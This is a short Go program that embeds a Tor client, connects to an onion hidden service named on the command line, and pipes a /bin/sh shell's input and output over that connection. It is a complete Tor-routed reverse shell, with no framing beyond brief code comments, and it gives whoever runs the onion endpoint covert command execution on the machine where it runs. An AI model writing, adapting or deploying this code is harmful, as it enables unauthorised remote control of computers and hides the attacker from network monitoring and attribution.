package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"time"

	"github.com/cretz/bine/process"
	"github.com/cretz/bine/tor"
	libtor "github.com/ipsn/go-libtor"
)

var creator = libtor.Creator

type LibTorWrapper struct{}

func (LibTorWrapper) New(ctx context.Context, args ...string) (process.Process, error) {
	return creator.New(ctx, args...)
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage " + os.Args[0] + " '<ONION>:<PORT>'")
		return
	}
	host := os.Args[1]
	// Start tor with some defaults
	fmt.Println("Starting tor instance, please wait a bit...")
	t, err := tor.Start(nil, &tor.StartConf{ProcessCreator: LibTorWrapper{}, DebugWriter: os.Stderr})
	if err != nil {
		log.Panicf("Failed to start tor: %v", err)
	}
	defer t.Close()

	// Wait at most a few minutes
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()

	// Make connection
	dialer, err := t.Dialer(ctx, nil)
	if err != nil {
		log.Fatal(err)
		return
	}

	// Connect to hidden service
	c, err := dialer.Dial("tcp", host)
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
	}
	defer c.Close()

	// Piping std{in,out,err} to the connection and running shell
	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
}
